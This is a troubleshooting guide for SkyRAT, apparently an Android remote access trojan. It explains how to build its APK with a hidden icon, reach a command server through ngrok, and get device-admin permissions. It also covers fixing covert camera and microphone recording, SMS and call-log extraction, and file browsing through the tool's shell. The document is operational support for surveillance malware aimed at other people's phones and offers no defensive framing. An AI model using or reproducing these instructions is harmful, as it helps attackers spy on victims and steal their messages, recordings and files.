# SkyRAT Troubleshooting Guide

Comprehensive troubleshooting guide for common SkyRAT issues and their solutions.

## 🎯 Quick Diagnostic Commands

Before diving into specific issues, run these diagnostic commands:

```bash
# Check SkyRAT installation
python3 skyrat.py --help

# Check Java installation
java -version

# Check Android SDK
echo $ANDROID_HOME

# Check network connectivity
ping google.com

# Test port availability
netstat -ln | grep 8000
```

## 🔧 Installation Issues

### **Python Installation Problems**

#### **Error: `python3: command not found`**
```bash
# Linux/Ubuntu
sudo apt install python3 python3-pip

# macOS
brew install python3

# Windows
# Download Python from https://python.org
# Ensure "Add to PATH" is checked during installation
```

#### **Error: `pip3: command not found`**
```bash
# Ubuntu/Debian
sudo apt install python3-pip

# CentOS/RHEL
sudo dnf install python3-pip

# macOS
# pip3 should be included with Python 3
# If missing: brew install python3

# Windows
python -m pip install --upgrade pip
```

#### **Error: Permission denied when installing packages**
```bash
# Solution 1: Use virtual environment (recommended)
python3 -m venv skyrat-env
source skyrat-env/bin/activate
pip3 install -r requirements.txt

# Solution 2: User installation
pip3 install --user -r requirements.txt

# Solution 3: Use sudo (not recommended)
sudo pip3 install -r requirements.txt
```

### **Java Installation Problems**

#### **Error: `java: command not found`**
```bash
# Ubuntu/Debian
sudo apt install openjdk-11-jdk

# CentOS/RHEL
sudo dnf install java-11-openjdk-devel

# macOS
brew install openjdk@11
echo 'export PATH="/opt/homebrew/opt/openjdk@11/bin:$PATH"' >> ~/.zshrc

# Windows
# Download OpenJDK from https://adoptium.net
# Add to system PATH
```

#### **Error: Wrong Java version**
```bash
# Check current version
java -version

# Install correct version (Ubuntu example)
sudo apt remove openjdk-8-jdk  # Remove old version
sudo apt install openjdk-11-jdk

# Set default version (if multiple installed)
sudo update-alternatives --config java
```

### **Android SDK Issues**

#### **Error: `ANDROID_HOME not set`**
```bash
# Find Android SDK location
find / -name "android" -type d 2>/dev/null | grep -i sdk

# Set environment variable (replace with your path)
export ANDROID_HOME="$HOME/Android/Sdk"
echo 'export ANDROID_HOME="$HOME/Android/Sdk"' >> ~/.bashrc
source ~/.bashrc
```

#### **Error: `sdkmanager: command not found`**
```bash
# Check if command line tools are installed
ls $ANDROID_HOME/cmdline-tools/

# If missing, run the setup script
./tools/android-sdk-setup.sh

# Or add to PATH manually
export PATH="$ANDROID_HOME/cmdline-tools/latest/bin:$PATH"
```

#### **Error: Android SDK setup script fails**
```bash
# Make script executable
chmod +x tools/android-sdk-setup.sh

# Run with debug output
bash -x tools/android-sdk-setup.sh

# Manual setup if script fails
mkdir -p ~/Android/Sdk
cd ~/Android/Sdk
wget https://dl.google.com/android/repository/commandlinetools-linux-9477386_latest.zip
unzip commandlinetools-linux-9477386_latest.zip
mkdir -p cmdline-tools
mv cmdline-tools latest_temp
mv latest_temp cmdline-tools/latest
```

## 🏗️ Build Issues

### **APK Build Failures**

#### **Error: `Gradle build failed`**
```bash
# Clean and rebuild
python3 skyrat.py --build --clean -i IP -p PORT

# Check Gradle wrapper permissions
chmod +x android/gradlew

# Manual Gradle build test
cd android
./gradlew clean
./gradlew assembleRelease

# Check for specific error messages
./gradlew assembleRelease --stacktrace
```

#### **Error: `Config.kt not found`**
```bash
# Verify Android source structure
ls -la android/app/src/main/java/com/techsky/skyrat/

# Check if Config.kt exists
cat android/app/src/main/java/com/techsky/skyrat/Config.kt

# If missing, ensure you have the complete Android source
```

#### **Error: `Permission denied` during build**
```bash
# Fix gradlew permissions
chmod +x android/gradlew

# Fix SDK permissions
chmod -R 755 $ANDROID_HOME

# Check disk space
df -h

# Check write permissions
touch android/test_write && rm android/test_write
```

#### **Error: `OutOfMemoryError` during build**
```bash
# Increase Gradle memory
echo "org.gradle.jvmargs=-Xmx4g" >> android/gradle.properties

# Close other applications
# Add swap space if needed (Linux)
sudo fallocate -l 2G /swapfile
sudo mkswap /swapfile
sudo swapon /swapfile
```

### **Configuration Issues**

#### **Error: `Invalid IP address format`**
```bash
# Valid IP examples
python3 skyrat.py --build -i 192.168.1.100 -p 8000  # ✓ Valid
python3 skyrat.py --build -i 10.0.0.5 -p 8000       # ✓ Valid
python3 skyrat.py --build -i localhost -p 8000       # ✗ Invalid (use 127.0.0.1)

# Check your IP address
ip addr show  # Linux
ifconfig      # macOS
ipconfig      # Windows
```

#### **Error: `Port already in use`**
```bash
# Check what's using the port
netstat -tlnp | grep 8000
lsof -i :8000

# Kill process using port
sudo kill -9 PID_NUMBER

# Use different port
python3 skyrat.py --build -i IP -p 9000
```

## 🌐 Network and Connection Issues

### **Server Connection Problems**

#### **Error: `Address already in use`**
```bash
# Check if server is already running
ps aux | grep skyrat

# Kill existing server
pkill -f skyrat.py

# Use different port
python3 skyrat.py --shell -i IP -p 9000

# Check firewall
sudo ufw status  # Ubuntu
sudo iptables -L  # Generic Linux
```

#### **Error: `Connection refused`**
```bash
# Verify server is running
python3 skyrat.py --shell -i 192.168.1.100 -p 8000

# Check if port is listening
netstat -ln | grep 8000

# Test with telnet
telnet 192.168.1.100 8000

# Check firewall rules
sudo ufw allow 8000  # Ubuntu
```

#### **Error: Device not connecting**
```bash
# Verify IP and port in APK
# Check network connectivity from device
# Test from device browser: http://SERVER_IP:PORT

# Check if device and server are on same network
# From server: ping DEVICE_IP
# From device: ping SERVER_IP

# Verify APK permissions are granted
# Check device's internet connection
```

### **Ngrok Issues**

#### **Error: `pyngrok not found`**
```bash
# Install pyngrok
pip3 install pyngrok

# Or install from requirements
pip3 install -r requirements.txt
```

#### **Error: `ngrok not authenticated`**
```bash
# Get auth token from ngrok.com
# Create account at https://ngrok.com

# Set auth token
ngrok authtoken YOUR_AUTH_TOKEN

# Verify authentication
ngrok authtoken --list
```

#### **Error: `ngrok tunnel failed`**
```bash
# Check ngrok status
ngrok status

# Kill existing tunnels
pkill ngrok

# Test manual ngrok
ngrok tcp 8000

# Check account limits
# Free accounts have connection limits
```

## 📱 Device and APK Issues

### **APK Installation Problems**

#### **Error: `Installation failed`**
```bash
# Enable unknown sources
# Android Settings > Security > Unknown Sources

# Use ADB install
adb install build/skyrat.apk

# Check APK file integrity
file build/skyrat.apk
unzip -t build/skyrat.apk

# Try different USB debugging mode
adb devices
```

#### **Error: `App not appearing`**
```bash
# Check if app installed
adb shell pm list packages | grep skyrat

# Check if icon is hidden (by design)
# Look for app in Settings > Apps

# Try visible icon build
python3 skyrat.py --build --visible-icon -i IP -p PORT
```

#### **Error: `Permissions denied`**
```bash
# Grant all permissions manually
# Android Settings > Apps > SkyRAT > Permissions

# Check permission status
adb shell dumpsys package com.techsky.skyrat | grep permission

# Some permissions require special approval
# Settings > Special app access > Device admin apps
```

### **Runtime Issues**

#### **Error: `App crashes on startup`**
```bash
# Check device logs
adb logcat | grep skyrat

# Check Android version compatibility
adb shell getprop ro.build.version.release

# Verify APK architecture matches device
adb shell getprop ro.product.cpu.abi

# Try debug build
python3 skyrat.py --build --debug -i IP -p PORT
```

#### **Error: `No network permissions`**
```bash
# Verify INTERNET permission in manifest
grep -i internet android/app/src/main/AndroidManifest.xml

# Check device network connectivity
adb shell ping google.com

# Test with different network (WiFi vs Mobile)
```

## 🎥 Recording and Media Issues

### **Video Recording Problems**

#### **Error: `Camera permission denied`**
```bash
# Grant camera permission manually
# Settings > Apps > SkyRAT > Permissions > Camera

# Check camera availability
SkyRAT:/> camList

# Test with different camera
SkyRAT:/> startVideo 1  # Front camera
```

#### **Error: `Video recording failed`**
```bash
# Check available storage
SkyRAT:/> shell df -h

# Try different video format
# Check device camera capabilities

# Test audio recording only
SkyRAT:/> startAudio
```

#### **Error: `Large video download timeout`**
```bash
# Wait longer for large files
# Videos can take several minutes to download

# Check server timeout settings
# Use debug mode to see progress
python3 skyrat.py --shell --debug -i IP -p PORT

# Split large recordings into smaller segments
```

### **Audio Recording Problems**

#### **Error: `Microphone permission denied`**
```bash
# Grant microphone permission
# Settings > Apps > SkyRAT > Permissions > Microphone

# Check for apps using microphone
# Close other voice/call apps
```

#### **Error: `Audio recording silent`**
```bash
# Check device volume settings
# Test device microphone with voice recorder

# Verify audio source availability
# Some devices restrict background audio
```

## 📊 Data Extraction Issues

### **SMS and Call Log Problems**

#### **Error: `Permission denied: READ_SMS`**
```bash
# Grant SMS permission
# Settings > Apps > SkyRAT > Permissions > SMS

# Some devices require additional steps
# Settings > Special app access > SMS access
```

#### **Error: `No SMS/Call data found`**
```bash
# Verify device has SMS/call data
# Check default messaging app

# Some custom ROMs handle data differently
# Try different extraction commands
```

### **File System Access Issues**

#### **Error: `Permission denied` for file access**
```bash
# Use different file paths
SkyRAT:/> ls /sdcard/
SkyRAT:/> ls /storage/emulated/0/

# Some paths require root access
# Try accessible directories first
```

#### **Error: `Storage access denied`**
```bash
# Grant storage permission
# Settings > Apps > SkyRAT > Permissions > Storage

# Android 11+ has scoped storage
# May limit file access
```

## 🔧 System and Performance Issues

### **High CPU/Memory Usage**

#### **Server using too much CPU**
```bash
# Monitor resource usage
top | grep python
htop

# Reduce concurrent connections
# Use lower timeout values
# Close debug mode if not needed
```

#### **Device performance issues**
```bash
# Check device resources
SkyRAT:/> sysinfo

# Limit concurrent operations
# Don't run multiple recordings simultaneously
# Monitor battery usage
```

### **Connection Stability Issues**

#### **Frequent disconnections**
```bash
# Check network stability
ping -c 100 SERVER_IP

# Use different port
# Check for network interference

# Increase timeout values if needed
```

#### **Slow command responses**
```bash
# Check network latency
ping SERVER_IP

# Use local network instead of external
# Reduce file transfer sizes
# Check device performance
```

## 🐛 Debugging and Diagnostics

### **Enable Debug Mode**
```bash
# Server debug mode
python3 skyrat.py --shell --debug -i IP -p PORT

# Build debug mode
python3 skyrat.py --build --debug -i IP -p PORT
```

### **Log Analysis**
```bash
# Android device logs
adb logcat | grep -i skyrat

# Server connection logs
# Debug mode shows detailed connection info

# System logs (Linux)
journalctl | grep skyrat
```

### **Network Analysis**
```bash
# Monitor network traffic
sudo tcpdump -i any port 8000

# Check active connections
netstat -an | grep 8000

# Test connectivity
nc -zv SERVER_IP 8000
```

## 📋 Diagnostic Checklist

When reporting issues, please provide:

### **System Information**
- [ ] Operating system and version
- [ ] Python version (`python3 --version`)
- [ ] Java version (`java -version`)
- [ ] Android SDK location (`echo $ANDROID_HOME`)

### **Network Information**
- [ ] Server IP and port
- [ ] Network type (local/external/ngrok)
- [ ] Firewall status
- [ ] Router/NAT configuration

### **Device Information**
- [ ] Android device model and version
- [ ] Network connectivity (WiFi/mobile)
- [ ] App installation method
- [ ] Permissions granted

### **Error Details**
- [ ] Complete error message
- [ ] Steps to reproduce
- [ ] Debug output (if available)
- [ ] Log files

## 🆘 Getting Additional Help

### **Community Support**
- **GitHub Issues**: https://github.com/techsky-eh/skyrat/issues
- **Discussions**: https://github.com/techsky-eh/skyrat/discussions

### **Before Asking for Help**
1. Check this troubleshooting guide
2. Search existing GitHub issues
3. Try basic diagnostic commands
4. Enable debug mode for detailed output

### **Creating Effective Bug Reports**
```markdown
## Environment
- OS: Ubuntu 22.04
- Python: 3.10.6
- Java: OpenJDK 11.0.16
- Android: Device model, Android version

## Issue Description
Clear description of the problem

## Steps to Reproduce
1. Step one
2. Step two
3. Step three

## Expected vs Actual Behavior
What should happen vs what actually happens

## Debug Output
```
Paste debug output here
```

## Additional Context
Any other relevant information
```

---

**Most issues can be resolved by following this guide. For complex problems, don't hesitate to seek community support with detailed information about your setup and the specific issue you're encountering.**